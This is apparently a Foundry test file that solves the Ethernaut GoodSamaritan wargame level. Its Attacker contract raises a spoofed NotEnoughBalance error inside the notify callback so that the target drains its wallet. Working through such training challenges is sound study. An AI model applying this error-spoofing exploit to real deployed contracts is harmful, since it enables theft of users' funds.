// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GoodSamaritan} from "ethernaut/levels/GoodSamaritan.sol";

contract GoodSamaritanTest is Test {
    GoodSamaritan target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        target = new GoodSamaritan();
    }

    function attack() private {
        Attacker attacker = new Attacker();
        attacker.pwn(target);
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(target.coin().balances(address(target.wallet())), 0, "balance should be 0");
    }
}

contract Attacker {
    // error signature will be taken from here
    error NotEnoughBalance();

    // entry point for our attack, simply requests a donation
    function pwn(GoodSamaritan target) external {
        target.requestDonation();
    }

    // notify is called when this contract receives coins
    function notify(uint256 amount) external pure {
        // only revert on 10 coins
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
